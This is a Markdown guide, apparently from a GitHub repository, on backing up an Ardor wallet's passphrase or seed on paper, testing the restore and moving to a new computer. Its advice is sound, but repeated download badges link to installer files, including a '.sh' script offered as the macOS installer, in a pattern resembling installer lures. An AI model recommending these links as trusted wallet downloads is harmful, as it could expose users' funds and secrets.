![Ardor Wallet guide](assets/banner-article.png)

# Back up an Ardor wallet and move it to a new computer

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Backing up an Ardor wallet means writing down the secret that derives the account - the passphrase or the seed - and proving it opens the same address after a restart. Moving to a new computer then takes an install and that secret, with no file to copy and no transfer between machines.

## What a backup actually is

There is no wallet file to save. The [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) is arithmetic: the secret produces the address, and the address is all the chain knows. A backup is therefore a copy of the secret, kept somewhere that is not the computer, in a form you can still read after the computer is gone.

That definition rules out the tempting shortcuts. A screenshot in a cloud-synced folder is a copy of the secret with an extra company in the loop. A text file on the same disk is not a backup at all. An email to yourself is a copy of the secret sitting in somebody else's database, searchable by anyone who ever compromises that account.

## The backup that works

1. Write the secret by hand on paper. Handwriting beats typing here, because it does not pass through a clipboard.
2. Check every word and every character against the screen, in order, before you put the paper away.
3. Restart the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md), enter the written copy from the paper only, and confirm the same address opens.
4. Store the paper where a fire, a flood or a burglary would not take both it and the machine.
5. Make a second copy in a different physical place, and treat both as equally sensitive.

Step three is the test that matters. A backup you have never restored is a hope, and the moment to discover a miswritten word is while the account is still empty.

## Where not to keep it

| Place | Why it fails |
|---|---|
| A screenshot or photo | It syncs to a cloud account and survives in backups you forgot about |
| A password manager note | Convenient, and it makes one master password the only thing between an attacker and the account |
| A chat message to yourself | It lives on a server, in a search index and in notification previews |
| A file on the same disk | It disappears with the disk, which is the exact event a backup is for |

A [passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) manager is not automatically wrong, but it changes what you are defending: the account is only as safe as the manager and its master password. Paper in two places defends against a different set of failures, and most people are better served by paper for the secret and nothing at all for the digital copy.

## Test the restore, not just the copy

A backup is only proven by a restore. Before the account holds anything, install the wallet on a second machine - or simply restart and clear the field - then type the secret from the paper alone and check the address. If it matches, the backup is real. If it does not, you have found the difference while it costs nothing, which is the entire reason this test belongs at setup rather than years later when the [Ardor balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) is worth protecting.

Run the same test after any change of secret or storage. A backup that has never been read since it was written is the one that fails, and it fails at the worst possible moment, because the reason you are reading it is that the machine is gone.

## Move to a new computer

1. Install the current release on the new machine and choose full client or light client.
2. Enter the secret on the passphrase tab, or the seed tab if that is what the backup holds.
3. Wait for the balance to appear: immediately on a light client once a remote node answers, after a sync on a full client.
4. Send a small test transaction to yourself or to an address you control before you move anything large.
5. Keep the old installation until the new one has both received and sent successfully.

The test transaction in step four is cheap and it exercises the whole path - signing, broadcasting, confirming - on the new machine. A wallet that shows a balance but cannot sign looks healthy right up until it matters.

## If the address is not what you expect

A different address means a different secret. Check spacing, capitalisation and word order against the paper, and use the passphrase tab rather than the account tab. If the paper itself is ambiguous, the recovery utility can search a small range of positions, which is exactly the case it exists for.

A correct address with a zero balance is a different problem: the chain is not caught up yet, or the balance sits on a child chain rather than the parent chain. Check the chain selector before concluding anything about the move.

## Retire the old machine

Once the new install has signed a transaction successfully, the old copy is a liability rather than a backup. Remove the wallet, and if it ran a full client, delete the blockchain database folder as well. Neither contains the secret, but both contain a history of an account you may no longer use on that hardware.

Keep the paper. Retiring a computer is not the same as retiring the account, and the paper is the thing that outlives every machine you install on.

## FAQ

### Do I need to export a file to back up the wallet?

No. The secret is the backup. Exporting a key from inside the wallet is a different operation for a different purpose and does not replace a written copy of the secret.

### Can I copy the wallet folder to a new computer?

You can copy the installation, but it will not carry the account, which is derived from the secret rather than stored in the folder. Copying the blockchain database only saves sync time.

### How often should I re-check the backup?

Once a year, and after any change of secret. Open the wallet from the paper only and confirm the address; a backup that has never been read since it was written is the one that tends to fail.

### What if I lose the paper and the computer?

The account is unreachable. There is no support route, no recovery service and no exception, which is why two copies in two places is the standard rather than a suggestion.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Ardor passphrase or seed phrase: which one do you have](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-passphrase-versus-seed-phrase.md)
- [Can you reset an Ardor passphrase? No - here is what to do](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md)
- [Recover a passphrase that has a typo](https://github.com/ardor-software/ardor-wallet-guides/blob/main/recovering-a-passphrase-typo-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
